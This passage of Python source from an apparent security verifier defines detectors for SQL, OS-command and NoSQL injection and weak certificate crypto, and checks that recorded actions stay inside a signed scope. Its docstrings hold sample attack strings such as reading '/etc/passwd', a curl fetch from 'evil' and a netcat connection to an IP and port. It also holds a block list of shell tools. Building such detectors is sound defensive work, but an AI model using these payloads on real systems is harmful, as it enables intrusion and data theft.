    offline, exactly like ``tls_weakness_oracle`` re-verifies a negotiated cipher name. Emitted under the
    TLS_WEAKNESS kind (a weak-crypto FACT). Never raises."""
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
                            evidence="no crypto-artifact evidence")
    name = _coerce_text(observed.get("signature_algorithm")).strip()
    oid = _coerce_text(observed.get("oid")).strip()
    subject = _coerce_text(observed.get("subject")).strip()
    subj = (" " + subject) if subject else ""
    # (1) BROKEN SIGNATURE HASH — collision-forgeable, no benign use.
    if (name and _WEAK_SIG_HASH_RE.search(name)) or (oid in _WEAK_SIG_OIDS):
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.95,
            evidence=(f"certificate{subj} is signed with the BROKEN hash {name or oid} — collision-forgeable "
                      "(MD5 chosen-prefix / SHA-1 SHAttered), no benign use"),
            observed={"signature_algorithm": name, "oid": oid, "subject": subject, "reason": "broken_sig_hash"})
    # (2) UNDERSIZED PUBLIC KEY — below the ~112-bit-security floor (NIST SP 800-131A, deprecated 2013).
    key_type = _coerce_text(observed.get("key_type")).strip().lower()
    try:
        key_bits = int(observed.get("key_bits"))
    except (TypeError, ValueError):
        key_bits = 0
    if key_bits > 0 and (
            (key_type in ("rsa", "dsa") and key_bits < _MIN_RSA_DSA_BITS)
            or (key_type == "ec" and key_bits < _MIN_EC_BITS)):
        floor = _MIN_RSA_DSA_BITS if key_type in ("rsa", "dsa") else _MIN_EC_BITS
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.9,
            evidence=(f"certificate{subj} uses an UNDERSIZED {key_type.upper()} public key ({key_bits}-bit, "
                      f"below the {floor}-bit floor) — under ~112-bit security (NIST SP 800-131A, deprecated 2013)"),
            observed={"key_type": key_type, "key_bits": key_bits, "subject": subject, "reason": "short_key"})
    return OracleSignal(
        kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
        evidence=f"signature algorithm {name or oid or '?'} is not a broken hash and the key is not undersized")


_SQL_TAUT_RE = re.compile(
    r"""(?i)^(OR|AND|XOR)\b\s*\(?\s*['"]?([A-Za-z0-9_]+)['"]?\s*(?:=|<=>|\bLIKE\b)\s*['"]?([A-Za-z0-9_]+)['"]?""")


_SQL_UNION_RE = re.compile(r"(?i)^UNION\b\s+(?:ALL\s+)?SELECT\b")


_SQL_STACK_RE = re.compile(
    r"(?is)^;\s*(?:"
    r"SELECT\b.{0,120}?\bFROM\b"
    r"|INSERT\b.{0,40}?\bINTO\b"
    r"|UPDATE\b.{0,80}?\bSET\b"
    r"|DELETE\b.{0,40}?\bFROM\b"
    r"|DROP\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER)\b"
    r"|CREATE\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER|PROCEDURE)\b"
    r"|ALTER\s+(?:TABLE|DATABASE|USER|SCHEMA)\b"
    r"|TRUNCATE\s+TABLE\b"
    r"|GRANT\b.{0,80}?\bTO\b"
    r"|EXEC(?:UTE)?\b\s+\w"
    r")")


def _sql_breakout_tails(text: str, quote: str):
    """Yield the QUERY-context tail after EACH UNESCAPED `quote` in `text` (the injection point is
    `... WHERE x=<quote>PAYLOAD<quote>`, and any quote in the payload could be the break-out). Honours
    `''` doubling and `\\` escapes so a legitimately-escaped quote stays inside the literal."""
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        if c == "\\" and i + 1 < n:
            i += 2                                  # backslash-escaped char stays in the literal
            continue
        if c == quote:
            if i + 1 < n and text[i + 1] == quote:
                i += 2                              # doubled quote ('' or "") = an escaped quote
                continue
            yield text[i + 1:]                      # unescaped closing quote -> a candidate tail
        i += 1


def _sql_structure_at_start(tail: str) -> str:
    """The SQL structure PROVEN present at the START of a break-out tail, or "" — the near-zero-FP
    proofs, each ANCHORED immediately after the break-out (leading whitespace/parens skipped): a
    boolean SELF-tautology (`OR 1=1`, `OR 'a'='a'`), a `UNION [ALL] SELECT`, or a stacked statement
    with a full statement shape (`; DROP TABLE`, `; SELECT .. FROM`). A lone comment (`--`/`/*`) is
    DELIBERATELY not a proof — `'Inception' -- best film`, pasted code comments, and prose em-dashes
    after a quoted word produce it, so it was a false positive; an attacker's comment almost always
    follows a tautology/UNION we already catch. Prose after an apostrophe never matches."""
    s = tail.lstrip().lstrip("()").lstrip()
    if not s:
        return ""
    m = _SQL_TAUT_RE.match(s)
    if m and m.group(2).lower() == m.group(3).lower():
        return f"{m.group(1).upper()} tautology ({m.group(2)}={m.group(3)})"
    if _SQL_UNION_RE.match(s):
        return "UNION SELECT"
    if _SQL_STACK_RE.match(s):
        return "stacked statement"
    return ""


def sql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff `payload`, placed inside a SQL string literal, PROVABLY closes it and introduces query
    STRUCTURE IMMEDIATELY after the break-out (a self-tautology / UNION SELECT / stacked statement /
    terminating comment). Proves a structured SQL injection ATTEMPT — never exploitation. The
    STRUCTURE must be anchored to the break-out quote, so ordinary apostrophe-bearing prose is safe:
    `O'Brien`, `it's fine`, `Don't drop the ball; I'll update you`, `I've got 5 or 6 options`,
    `credit union, please select` all have only text after the apostrophe and never fire.
    Pure/deterministic."""
    kind = OracleKind.SQL_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    if len(text) < 3 or ("'" not in text and '"' not in text):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no string-literal break-out (no quote to close the literal)",
                            observed={"param": param})
    for quote in ("'", '"'):
        for tail in _sql_breakout_tails(text, quote):
            struct = _sql_structure_at_start(tail)
            if struct:
                return OracleSignal(
                    kind=kind, fired=True, confidence=0.92,
                    evidence=(f"payload closes a {quote} SQL string literal and introduces query "
                              f"structure ({struct}) at the break-out — a structured SQL injection attempt"),
                    observed={"param": param, "quote": quote, "structure": struct, "break_out": True})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence="quote present but no SQL structure anchored to a break-out (inert prose, e.g. an apostrophe in text)",
        observed={"param": param})


_SHELL_CMDS = ("cat", "ls", "id", "whoami", "uname", "nc", "ncat", "netcat", "curl", "wget", "bash",
               "sh", "zsh", "ksh", "powershell", "pwsh", "nslookup", "dig", "cmd", "python", "python3",
               "perl", "ruby", "php", "chmod", "chown", "mkfifo", "telnet", "socat", "base64", "xxd",
               "hostname", "ifconfig", "ping", "certutil", "sleep", "rm", "kill", "env")


_CMD_ALT = "|".join(sorted(set(_SHELL_CMDS), key=lambda s: (-len(s), s)))


_SHELL_CMD_RE = re.compile(r"(?i)(?<![A-Za-z0-9_])(" + _CMD_ALT + r")(?![A-Za-z0-9_])")


_SHELL_CMD_AT_START_RE = re.compile(r"(?i)^(" + _CMD_ALT + r")(?![A-Za-z0-9_])")


_SHELL_SUBST_RE = re.compile(r"\$\(([^)]{1,300})\)|`([^`]{1,300})`")


_SHELL_SYS_DIRS = ("etc", "bin", "usr", "tmp", "var", "dev", "proc", "root", "sys", "opt", "home",
                   "sbin", "lib", "lib64", "mnt", "srv", "boot", "run", "media")


_SHELL_ARG_RE = re.compile(
    r"(?i)(?:/(?:" + "|".join(_SHELL_SYS_DIRS) + r")\b|\.\.?/|(?<=\s)-[a-z]{1,3}\b"
    r"|https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b)")


def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff `payload` contains an OS-command-execution construct PROVEN by a dangerous command
    invoked WITH a shell argument — inside a command substitution (`$(cat /etc/passwd)`, `` `curl
    http://evil/x` ``), or AFTER a command separator (`; cat /etc/passwd`, `| nc 10.0.0.1 4444`).
    Conservative for near-zero FP: (a) a bare command name is not a proof, so a shell argument is
    required; (b) the separator branch SKIPS the first segment (a value that merely BEGINS with a
    command word — `python-requests/2.25.1`, `id > 1000` — had no preceding separator and is benign);
    (c) `>`/`|` and `tool/version` slashes are not arguments. So `$(id)` / `` `code` `` / `dog|cat` /
    `Name | Age | ID` / `id > 1000` / `python-requests/2.25.1` do NOT fire. ReDoS-safe (split on the
    separator class). Pure/deterministic; proves an ATTEMPT, never exploitation."""
    kind = OracleKind.COMMAND_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    if len(text) < 4:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="too short to carry a command-execution construct",
                            observed={"param": param})
    # (1) command substitution wrapping a dangerous command WITH an argument. `$(...)` / backticks are
    # already a strong shell signal, so a whitespace-separated argument also suffices — `$(id)` /
    # `` `code` `` / `$(document)` do NOT fire, but `$(sleep 5)` / `$(cat /etc/passwd)` do.
    for m in _SHELL_SUBST_RE.finditer(text):
        body = m.group(1) or m.group(2) or ""
        cmd = _SHELL_CMD_RE.search(body)
        if not cmd:
            continue
        after = body[cmd.end():]
        # a command immediately followed by `=` is a key=value / assignment / URL query param
        # (`id=https://...`), NOT a command invocation — the review's header/cookie false positive.
        if after[:1] == "=":
            continue
        if _SHELL_ARG_RE.search(after) or re.match(r"\s+\S", after):
            return OracleSignal(
                kind=kind, fired=True, confidence=0.9,
                evidence=(f"shell command substitution invokes {cmd.group(1)!r} with an argument — "
                          f"a structured OS command injection attempt"),
                observed={"param": param, "construct": "substitution", "command": cmd.group(1).lower()})
    # (2) a command SEPARATOR then a dangerous command WITH a shell argument. Split on the separator
    #     class (linear, no backtracking) and inspect each segment AFTER a real separator — segment[0]
    #     had NO preceding separator, so a value that merely starts with a command word is not a proof.
    for seg in re.split(r"[;|&\n\r]", text)[1:]:
        seg = seg.strip()
        cmd = _SHELL_CMD_AT_START_RE.match(seg)
        if not cmd:
            continue
        after = seg[cmd.end():]
        # `id=https://cdn/...` (a `&`-split URL query param in a Referer/cookie) is a key=value, NOT a
        # command invocation — the review's header/cookie command-injection false positive.
        if after[:1] == "=":
            continue
        if _SHELL_ARG_RE.search(after):
            return OracleSignal(
                kind=kind, fired=True, confidence=0.9,
                evidence=(f"a command separator chains to {cmd.group(1)!r} with an argument — "
                          f"a structured OS command injection attempt"),
                observed={"param": param, "construct": "separator+command", "command": cmd.group(1).lower()})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence="no command-execution construct (a bare command name or lone metacharacter is not a proof)",
        observed={"param": param})


_NOSQL_OPERATORS: frozenset[str] = frozenset({
    "ne", "eq", "gt", "gte", "lt", "lte", "in", "nin",     # comparison
    "or", "and", "nor", "not",                              # logical
    "exists",                                              # element
    "where", "expr", "mod", "text", "jsonschema",          # evaluation
    "all", "elemmatch", "size",                            # array
})


_NOSQL_OP_ALT = "|".join(sorted(_NOSQL_OPERATORS, key=lambda s: (-len(s), s)))


_NOSQL_PARAM_OP_RE = re.compile(r"(?i)(?:^|\[)\$(" + _NOSQL_OP_ALT + r")(?=$|\])")


_NOSQL_JSON_CAP = 65536      # bound the JSON parse input on the value path (DoS-safe on adversarial input)


_NOSQL_SCAN_DEPTH = 32       # bound the recursion over a parsed JSON value (stack-safe)


def _nosql_operator_key(obj: Any, depth: int = 0) -> str:
    """The first KNOWN MongoDB operator appearing as an object KEY anywhere in a parsed JSON `obj` (to a
    bounded depth), returned WITH its `$` (e.g. ``"$ne"``), or "". Only a KEY counts — an operator as a
    string VALUE or a list element is inert (that is ordinary data / documentation, not query structure)."""
    if depth > _NOSQL_SCAN_DEPTH:
        return ""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(k, str) and k[:1] == "$" and k[1:].lower() in _NOSQL_OPERATORS:
                return "$" + k[1:].lower()
            hit = _nosql_operator_key(v, depth + 1)
            if hit:
                return hit
    elif isinstance(obj, list):
        for v in obj[:256]:                                 # bounded fan-out
            hit = _nosql_operator_key(v, depth + 1)
            if hit:
                return hit
    return ""


def _nosql_operator_key_in_json_text(text: str) -> str:
    """Parse ``text`` as JSON (only when it looks like a container) and return the first operator-as-key,
    or "". A non-JSON value (a price, an email, a scalar) parses to nothing here and stays inert."""
    s = text.strip()
    if s[:1] not in ("{", "[") or len(s) > _NOSQL_JSON_CAP:
        return ""
    try:
        obj = json.loads(s)
    except (ValueError, TypeError, RecursionError):
        return ""
    return _nosql_operator_key(obj)


def nosql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff a request carries a MongoDB QUERY OPERATOR injected as a KEY where a SCALAR was expected —
    either (1) the PARAM NAME has a `$operator` as a whole BRACKET key segment (`user[$ne]`, `q[$gt]`,
    `a[b][$in]`, `$where`), which the framework nests into `{user:{$ne:…}}`; or (2) the VALUE parses to
    JSON with a `$operator` object KEY (`{"$ne":null}`). Proves a STRUCTURED NoSQL operator-injection
    ATTEMPT, never exploitation. Near-zero-FP: the token must be a KNOWN query operator (curated allowlist
    — the EJSON/JSON-Schema/DBRef `$`-keys AND the dual-use `$type`/`$regex` are excluded, since they are
    also legitimate .NET type-discriminators / EJSON regex data) AND a KEY, so a price `$5.00`, `$net`, an
    email, a regex `^admin$`, a mid-word `$` (`pass$word`), an operator as a string VALUE (`["$ne"]`), and
    a plain scalar all stay inert. Pure/deterministic; bounded; ReDoS-safe."""
    kind = OracleKind.NOSQL_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    name = param if isinstance(param, str) else str(param if param is not None else "")
    # (1) the PARAM NAME injects an operator as a nested bracket/dot KEY -> a query operator lands where a
    #     scalar param was declared. The strongest proof: it is proven by the request's own key structure.
    m = _NOSQL_PARAM_OP_RE.search(name)
    if m:
        op = "$" + m.group(1).lower()
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"parameter {name!r} injects the MongoDB query operator {op!r} as a nested key where "
                      f"a scalar was expected — a structured NoSQL operator-injection attempt"),
            observed={"param": name, "operator": op, "vector": "operator_as_param_key", "break_out": True})
    # (2) the VALUE is a JSON object literal whose KEY is a known operator (`username={"$ne":null}`).
    op = _nosql_operator_key_in_json_text(text)
    if op:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"value parses to JSON carrying the MongoDB query operator {op!r} as an object key "
                      f"where a scalar was expected — a structured NoSQL operator-injection attempt"),
            observed={"param": name, "operator": op, "vector": "operator_as_json_key", "break_out": True})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=("no NoSQL operator-injection structure (a $-prefixed KNOWN query operator as a KEY where "
                  "a scalar was expected); a $ in text/a price/an operator-shaped string value is inert"),
        observed={"param": name})


# --- the canonical-context reader: dispatch a general oracle_context to its ported oracle(s) ----
# Mirrors ``verify.verifier.OracleVerifier._run`` for the ported kinds EXACTLY: the same ctx keys,
# the same PROTOCOL-CONSTANT pins (the differential discriminator and the timing alpha are chosen by
# the AUTHORITY, never the producer ctx — audit F8 / B3b), and the same baseline-admissibility
# refusal (a ``request_smuggling`` baseline/mutated pair is not admissible — RED-PEN B3). The
# retained ``oracle_context`` is the canonical verifier-context (verify.adapter.FindingContext.
# to_verifier_context), so these keys read identically in a FindingContext dump or that projection.
_GENERAL_HIGH_CONFIDENCE = 0.7  # verify.verifier.HIGH_CONFIDENCE — the confirm threshold
_GENERAL_TIMING_PROTOCOL_ALPHA = 0.01  # verify.verifier._TIMING_PROTOCOL_ALPHA
# verify.verifier._DIFFERENTIAL_CONTENT_DISCRIMINATOR — the default for EVERY class reaching the
# differential arm (the protocol table _DIFFERENTIAL_PROTOCOL_DISCRIMINATORS is deliberately empty).
_GENERAL_DIFFERENTIAL_CONTENT_DISCRIMINATOR: dict = {
    "dimensions": ["status", "length", "lexical"],
    "length_threshold": 0.05,
    "lexical_threshold": 0.10,
    "expect": "differ",
}
# verify.verifier._DIFFERENTIAL_BASELINE_REFUSED. No alias in verify.verifier._ALIASES folds onto
# ``request_smuggling`` (checked against the in-tree table), so the string-normalised class suffices;
# the parity harness pins this dispatch to verifier._run over a request_smuggling context so a future
# alias drift is caught.
_GENERAL_DIFFERENTIAL_BASELINE_REFUSED = frozenset({"request_smuggling"})


def _general_normalize_bug_class(bug_class: Any) -> str:
    """The string normalisation of ``verify.verifier.normalize_bug_class`` (strip / lower / ``-``,
    space -> ``_`` / collapse runs). The alias fold is omitted because no alias maps onto the only
    class this dispatch keys on (``request_smuggling``); see the note above."""
    key = (str(bug_class or "")).strip().lower().replace("-", "_").replace(" ", "_")
    while "__" in key:
        key = key.replace("__", "_")
    return key


def _general_differential_discriminator() -> dict:
    """The discriminator the AUTHORITY re-executes a differential with — a fresh copy, never the
    producer's (audit F8). The protocol table is empty, so it is always the content discriminator."""
    d = _GENERAL_DIFFERENTIAL_CONTENT_DISCRIMINATOR
    return {**d, "dimensions": list(d["dimensions"])}


# (ctx-key predicate, re-fire closure, kind label). One entry per ported OracleKind, in the same
# order verifier._run checks them. Each closure takes the whole verifier-context and returns an
# ``OracleSignal`` (or ``None`` when the keys are present but the AUTHORITY refuses, e.g. a
# request_smuggling baseline/mutated pair). ``reexecute_general_oracle`` runs every ported oracle
# whose keys are present and combines exactly as verifier.confirm does (any high-confidence fire).
def _gen_differential(ctx: Mapping) -> "OracleSignal | None":
    if "smuggling_desync" in ctx:
        return smuggling_desync_oracle(ctx["smuggling_desync"])
    if "baseline" in ctx and "mutated" in ctx:
        if _general_normalize_bug_class(ctx.get("bug_class", "")) in _GENERAL_DIFFERENTIAL_BASELINE_REFUSED:
            return None
        return differential_response_oracle(ctx["baseline"], ctx["mutated"],
                                            _general_differential_discriminator())
    return None


def _gen_timing(ctx: Mapping) -> "OracleSignal | None":
    if "baseline_latencies" in ctx and "treatment_latencies" in ctx:
        return timing_oracle(ctx["baseline_latencies"], ctx["treatment_latencies"],
                             injected_ms=ctx.get("timing_injected_ms"),
                             alpha=_GENERAL_TIMING_PROTOCOL_ALPHA, dose=ctx.get("timing_dose"))
    return None


def _gen_boolean(ctx: Mapping) -> "OracleSignal | None":
    if "probe_rounds" in ctx:
        return boolean_inference_oracle(ctx["probe_rounds"],
                                        false_baseline_samples=ctx.get("false_baseline_samples"))
    return None


def _gen_side_effect(ctx: Mapping) -> "OracleSignal | None":
    if "marker" in ctx and "observed_sink" in ctx:
        return side_effect_oracle(ctx["marker"], ctx["observed_sink"], ctx.get("observed_sink_control"))
    return None


def _gen_reflection(ctx: Mapping) -> "OracleSignal | None":
    if "marker" in ctx and "observed_sink" in ctx:
        return reflection_context_oracle(ctx["marker"], ctx["observed_sink"])
    return None


def _gen_evaluation(ctx: Mapping) -> "OracleSignal | None":
    if "ssi_expected" in ctx and "ssi_observed" in ctx:
        return ssi_evaluation_oracle(ctx.get("ssi_raw", ""), ctx["ssi_expected"],
                                     ctx["ssi_observed"], ctx.get("ssi_control"))
    if "eval_expected" in ctx and "eval_observed" in ctx:
        return evaluation_oracle(ctx.get("eval_raw", ""), ctx["eval_expected"],
                                 ctx["eval_observed"], ctx.get("eval_control"))
    return None


def _gen_error_signature(ctx: Mapping) -> "OracleSignal | None":
    if "error_observed" in ctx:
        return error_signature_oracle(ctx["error_observed"], ctx.get("error_control"))
    return None


def _gen_sanitizer(ctx: Mapping) -> "OracleSignal | None":
    if "process_output" in ctx:
        return sanitizer_signal_oracle(ctx["process_output"])
    return None


def _gen_system_prompt_disclosure(ctx: Mapping) -> "OracleSignal | None":
    if "canary" in ctx and "llm_output" in ctx:
        return system_prompt_disclosure_oracle(ctx["canary"], ctx["llm_output"])
    return None


def _gen_prompt_injection(ctx: Mapping) -> "OracleSignal | None":
    if "pi_control" in ctx and "pi_treatment" in ctx:
        return prompt_injection_oracle(ctx["pi_control"], ctx["pi_treatment"])
    return None


def _gen_sql_breakout(ctx: Mapping) -> "OracleSignal | None":
    if "request_payload" in ctx:
        return sql_injection_breakout_oracle(ctx["request_payload"], param=str(ctx.get("payload_param", "")))
    return None


def _gen_command_breakout(ctx: Mapping) -> "OracleSignal | None":
    if "request_payload" in ctx:
        return command_injection_breakout_oracle(ctx["request_payload"], param=str(ctx.get("payload_param", "")))
    return None


def _gen_nosql_breakout(ctx: Mapping) -> "OracleSignal | None":
    if "request_payload" in ctx:
        return nosql_injection_breakout_oracle(ctx["request_payload"], param=str(ctx.get("payload_param", "")))
    return None


def _gen_weak_crypto(ctx: Mapping) -> "OracleSignal | None":
    if "crypto_artifact" in ctx:
        return weak_crypto_artifact_oracle(ctx["crypto_artifact"])
    return None


def _gen_prototype_pollution(ctx: Mapping) -> "OracleSignal | None":
    if "proto_pollution" in ctx:
        return prototype_pollution_oracle(ctx["proto_pollution"])
    return None


# One entry per ported family (kind label -> re-fire closure). The breakout entries dispatch on the
# SAME ``request_payload`` key but are mutually exclusive by the finding's bug_class in-tree; a
# retained context carries at most one request-payload oracle's finding, so running the matching one
# is faithful — the dispatch keys the breakout on the declared class to avoid re-firing all three.
_GENERAL_ORACLE_DISPATCH: tuple = (
    ("differential_response", _gen_differential),
    ("timing", _gen_timing),
    ("boolean_inference", _gen_boolean),
    ("side_effect", _gen_side_effect),
    ("reflection_context", _gen_reflection),
    ("evaluation", _gen_evaluation),
    ("error_signature", _gen_error_signature),
    ("sanitizer_signal", _gen_sanitizer),
    ("system_prompt_disclosure", _gen_system_prompt_disclosure),
    ("prompt_injection", _gen_prompt_injection),
    ("prototype_pollution", _gen_prototype_pollution),
)
# request_payload breakout families, keyed on the declared bug_class so only the matching parse-proof
# oracle re-fires (mirrors verifier._run, where the class selects exactly one breakout kind).
_GENERAL_BREAKOUT_BY_CLASS: dict = {
    "sqli_attempt": ("sql_injection_breakout", _gen_sql_breakout),
    "command_injection_attempt": ("command_injection_breakout", _gen_command_breakout),
    "nosql_injection_attempt": ("nosql_injection_breakout", _gen_nosql_breakout),
}
# TLS_WEAKNESS kind is shared: the LIVE tls handshake path (tls key) is IRREDUCIBLE and NOT ported;
# only the PURE weak-crypto-artifact path (crypto_artifact key) is re-derived here.
_GENERAL_WEAK_CRYPTO = ("tls_weakness", _gen_weak_crypto)


def reexecute_general_oracle(oracle_context: Any) -> dict:
    """VIGIL-FREE re-execution of a general FACT's retained ``oracle_context`` (Step 2 of the audit
    package for the PURE, stdlib-only oracle families). Re-fires every PORTED oracle whose retained
    keys are present and reproduces the in-tree ``verifier.confirm`` combine (any high-confidence
    fire) over the ported signals.

    Returns ``{"signals": [{kind, fired, conclusive, confidence}, ...], "fired": bool,
    "reproduced": bool, "unported_keys": [...]}`` where ``fired`` is the re-derived positive verdict
    (a ported oracle fired at or above the confirm threshold) and ``reproduced`` is True iff at least
    one ported oracle had keys present to re-fire. ``unported_keys`` names any IRREDUCIBLE oracle key
    present in the context whose re-execution this file cannot perform standalone (so the caller is
    told, honestly, that the FACT also rests on an in-VIGIL re-run — never that it was reproduced).

    HONEST BOUND: re-firing proves the verdict is the correct FUNCTION of the retained evidence, NOT
    that the evidence is live. See the section header."""
    if not isinstance(oracle_context, Mapping):
        return {"signals": [], "fired": False, "reproduced": False, "unported_keys": []}
    ctx = oracle_context
    bug_class = _general_normalize_bug_class(ctx.get("bug_class", ""))
    signals: list = []

    def _record(kind: str, sig: "OracleSignal | None") -> None:
        if sig is not None:
            signals.append({"kind": kind, "fired": bool(sig.fired), "conclusive": bool(sig.conclusive),
                            "confidence": float(sig.confidence)})

    for kind, fn in _GENERAL_ORACLE_DISPATCH:
        _record(kind, fn(ctx))
    # the request_payload breakout — only the family the declared class selects (faithful to _run)
    if "request_payload" in ctx:
        entry = _GENERAL_BREAKOUT_BY_CLASS.get(bug_class)
        if entry is not None:
            kind, fn = entry
            _record(kind, fn(ctx))
    _record(*(_GENERAL_WEAK_CRYPTO[0], _GENERAL_WEAK_CRYPTO[1](ctx)))

    # Oracle keys present but NOT re-derived standalone HERE (a genuinely-irreducible oracle, or a
    # pure-but-not-yet-ported one) — REPORT them so the caller is told the FACT also rests on an
    # in-VIGIL re-run; never fake them as reproduced.
    unported = [k for k in _GENERAL_UNPORTED_CONTEXT_KEYS if k in ctx]
    fired = any(s["fired"] and s["confidence"] >= _GENERAL_HIGH_CONFIDENCE for s in signals)
    return {"signals": signals, "fired": fired, "reproduced": bool(signals), "unported_keys": unported}


# The oracle_context keys whose oracle this file does NOT re-derive standalone — either genuinely
# IRREDUCIBLE (version_advisory -> packaging, saml_xml -> signxml/lxml, oob_hits -> external collector)
# or PURE-BUT-NOT-YET-PORTED (the live-capture / browser / subprocess / cloud-API families; re-fireable
# with stdlib+cryptography, port is follow-up). Presence is REPORTED by reexecute_general_oracle, never
# re-derived here — see LIMIT-audit-package-reproduction + test_bucket_classification_is_enforced.
_GENERAL_UNPORTED_CONTEXT_KEYS = frozenset({
    "handshake", "anon_get", "tls", "dom_binding_calls", "oob_hits", "version_advisory",
    "cert_validity", "credential_acceptance", "jwt_token", "saml_xml", "imds_capture",
    "secret_capture", "gcp_impersonation_capture", "iam_escalation_capture", "auth_events",
    "requested_path", "mobile_control", "static_rule", "session_fixation", "mfa_bypass",
    "password_reset_invariant", "csrf_achieved", "workflow_abuse", "clickjacking_control",
    "csrf_control", "postmessage_control", "csp_control", "email_auth_control", "identity_control",
    "k8s_rbac_grant_control",
})

# ---------------------------------------------------------------------------
# 9. Authority-Envelope certificate (the accountability twin) — standalone, VIGIL-free.
#    Re-checks: the m-of-n governance signature + the out-of-band pin; the owner-signed envelope; and
#    re-derives CONFORMANCE (every EXECUTED action inside the envelope) — a forged "conformant" verdict,
#    or an executed action that left the envelope, is refused. Mirrors posture.authority byte-for-byte.
# ---------------------------------------------------------------------------
_AUTH_ENVELOPE_DOMAIN = b"vigil-authority-envelope-v1\x00"


def _auth_envelope_core(env: dict) -> dict:
    return {
        "schema_version": env.get("schema_version", 1),
        "owner_pubkey": env.get("owner_pubkey"),
        "engagement": env.get("engagement"),
        "scope_hosts": sorted(str(h) for h in (env.get("scope_hosts") or [])),
        "action_allowlist": sorted(str(a) for a in (env.get("action_allowlist") or [])),
        "not_before": int(env.get("not_before", 0)),
        "not_after": int(env.get("not_after", 0)),
    }


def _verify_auth_envelope(env: dict, owner_pubkey: str, engagement: str) -> tuple[bool, str]:
    if not isinstance(env, dict) or env.get("owner_pubkey") != owner_pubkey:
        return False, "authority envelope is not by the pinned owner key"
    if env.get("engagement") != engagement:
        return False, f"envelope engagement {env.get('engagement')!r} != required {engagement!r}"
    sig = env.get("sig")
    if not sig or not verify_one(str(owner_pubkey), _AUTH_ENVELOPE_DOMAIN + canonical_json(_auth_envelope_core(env)), str(sig)):
        return False, "authority envelope signature does not verify against the owner key"
    return True, "envelope OK"


def _auth_host(target: str) -> str:
    return urlsplit(str(target)).hostname or (str(target) or "")


def _derive_conformance(env: dict, actions: list) -> dict:
    scope = set(env.get("scope_hosts") or [])
    allow = set(env.get("action_allowlist") or [])
    nb, na = int(env.get("not_before", 0)), int(env.get("not_after", 0))
    violations, n_exec = [], 0
    for a in actions:
        executed = bool(a.get("executed")) or str(a.get("gate_outcome", "")).lower() in ("allow", "auto", "executed")
        if not executed:
            continue
        n_exec += 1
        reasons = []
        if _auth_host(a.get("target", "")) not in scope:
            reasons.append("target out of scope")
        if str(a.get("action_kind", "")) not in allow:
            reasons.append("action kind not permitted")
        at = int(a.get("at", 0))
        if na and not (nb <= at <= na):
            reasons.append("outside the authority window")
        if reasons:
            violations.append({"seq": a.get("seq"), "action_kind": a.get("action_kind"),
                               "target": a.get("target"), "reasons": reasons})
    return {"conformant": not violations, "violations": violations,
            "n_actions": len(actions), "n_executed": n_exec}


def verify_authority(authority: dict, *, pin: str, owner_pubkey: str, engagement: str) -> tuple[bool, str]:
    """Standalone-verify an Authority-Envelope certificate. ``authority`` = {"certificate": {...},
    "signature": {...}}. Fail-closed: pin, m-of-n signature, owner envelope, re-derived conformance."""
    cert = authority.get("certificate") or {}
    sig_env = authority.get("signature") or {}
    tr = sig_env.get("trust_root") or {}
    fp = _authorizer_fingerprint(tr.get("authorizers") or [])
    pin_s = (pin or "").strip()
    if not pin_s:
        return False, f"UNPINNED — supply the out-of-band authority fingerprint ({fp})"
    want = pin_s if pin_s.startswith("sha256:") else ("sha256:" + pin_s)
    if want.lower() != fp.lower():
        return False, f"authority trust-root pin MISMATCH — expected {want}, got {fp}"
    msg = canonical_json(cert)
    if sig_env.get("scorecard_digest") is not None and sig_env.get("scorecard_digest") != "sha256:" + sha256_hex(msg):
        return False, "authority certificate digest does not match the canonical bytes"
    ok, _valid, reason = verify_threshold(msg, sig_env.get("signatures") or [], tr)
    if not ok:
        return False, f"authority signature: {reason}"
    eok, ereason = _verify_auth_envelope(cert.get("envelope") or {}, owner_pubkey, engagement)
    if not eok:
        return False, f"authority envelope: {ereason}"
    rederived = _derive_conformance(cert.get("envelope") or {}, cert.get("actions") or [])
    if rederived != cert.get("conformance"):
        return False, "conformance does not match the re-derivation from the recorded ledger"
    if not rederived["conformant"]:
        return False, f"NON-CONFORMANT: {len(rederived['violations'])} executed action(s) left the envelope"
    return True, (f"SOUND: {rederived['n_executed']}/{rederived['n_actions']} executed action(s) all inside "
                  f"the owner-signed authority envelope (conformance over the recorded ledger)")


def verify_bundle(bundle: dict, *, signer_pubkeys: Optional[dict] = None,
                  trust_root: Optional[dict] = None, witness_trust_root: Optional[dict] = None,
                  pin: str = "", witness_pin: str = "",
                  min_distinct_signers: Optional[int] = None,
                  tsa_cert_pin: Optional[str] = None,
                  notary_pin: str = "",
                  posture_pin: str = "", posture_owner_pubkey: str = "",
                  posture_engagement: str = "", posture_now: Optional[int] = None,
                  authority_pin: str = "", authority_owner_pubkey: str = "",
                  authority_engagement: str = "") -> tuple[bool, list]:
    """Verify every component present in ``bundle`` against the out-of-band-pinned trust material. Returns
    (sound, log_lines). ``sound`` is True iff at least one component is present and EVERY present component
    is SOUND. A component whose required trust material is missing is a NOT-SOUND (fail-closed)."""
